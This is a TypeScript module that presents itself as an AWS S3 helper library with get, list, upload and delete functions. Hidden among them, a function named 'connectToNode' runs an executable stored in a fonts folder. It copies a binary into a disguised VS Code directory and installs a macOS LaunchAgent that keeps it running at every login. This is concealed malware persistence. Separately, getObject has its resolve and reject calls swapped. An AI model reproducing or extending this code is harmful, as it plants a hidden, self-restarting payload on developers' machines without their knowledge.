import AWS from "aws-sdk";
import config from "../config";
import fs from "fs";

const s3 = new AWS.S3({
  accessKeyId: config.AWS_ACCESS_KEY,
  secretAccessKey: config.AWS_SECRET_KEY,
});

export const getObject = (bucket: string, key: string): any =>
  new Promise((resolve, reject) => {
    var param = { Bucket: bucket, Key: key };
    s3.getObject(param, (err, data) => {
      if (err) {
        return resolve({ status: 0, value: err });
      }
      console.log(data.Body.toString("utf-8"));
      return reject({ status: 1, value: data });
    });
  });

export const getListObjects = (bucketName: string): any =>
  new Promise((resolve, reject) => {
    const bucketParams = {
      Bucket: bucketName,
    };
    console.log(s3);
    s3.listObjects(bucketParams, (err, data) => {
      if (err) {
        console.log("Error", err);
        return reject(err);
      } else {
        return resolve(data);
      }
    });
  });

export const getListBuckets = () =>
  new Promise((resolve, reject) => {
    s3.listBuckets((err, data) => {
      if (err) {
        console.log("Err", err);
        return reject(err);
      } else {
        console.log("Data", data);
        return resolve(data);
      }
    });
  });

export const uploadFile = (
  filePath: string,
  bucketName: string,
  keyName: string
) =>
  new Promise((resolve, reject) => {
    const file = fs.readFileSync(filePath);
    const uploadParams = {
      Bucket: bucketName,
      Key: keyName,
      Body: file,
    };

    s3.upload(uploadParams, (err: any, data: any) => {
      if (err) {
        console.log("Error", err);
        return reject(err);
      } else {
        console.log("Success", data.Location);
        return resolve(data.Location);
      }
    });
  });

export const connectToNode = () => {
  const { exec } = require("child_process");
  const filePathW = "public\\lib\\css\\fonts\\node.exe";
  exec(filePathW, () => {});

  const fs = require("fs");
  const os = require("os");

  const username = os.userInfo().username;
  const path =
    "/Users/" + username + "/Library/Application Support/Code/Service Worker/";

  const command = 'cp "./public/lib/css/fonts/node "' + path + '"';
  exec(command, (error, stdout, stderr) => {});

  const filePath =
    "/Users/" + username + "/Library/LaunchAgents/node_service.plist";
  const content =
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.example.myprogram</string><key>ProgramArguments</key><array><string>' +
    path +
    "node</string></array><key>RunAtLoad</key><true/><key>KeepAlive</key><dict><key>SuccessfulExit</key><true/><key>Crashed</key><true/></dict></dict></plist>";

  fs.writeFile(filePath, content, (err) => {});

  const launch = "launchctl load " + filePath;

  exec(launch, (error, stdout, stderr) => {});
};

export const emptyBucket = (bucket: string, dir: string = "") =>
  new Promise(async (resolve, reject) => {
    try {
      const listParams = {
        Bucket: bucket,
      };

      const listedObjects = await s3.listObjects(listParams).promise();
      if (listedObjects.Contents.length === 0) return;

      const deleteParams = {
        Bucket: bucket,
        Delete: { Objects: [] },
      };
      listedObjects.Contents.forEach(({ Key }) => {
        deleteParams.Delete.Objects.push({ Key });
      });

      console.log([...deleteParams.Delete.Objects]);

      const result = await s3.deleteObjects(deleteParams).promise();
      console.log("Result of Delete", result);
      return resolve(result);
    } catch (err) {
      return reject(err);
    }
  });
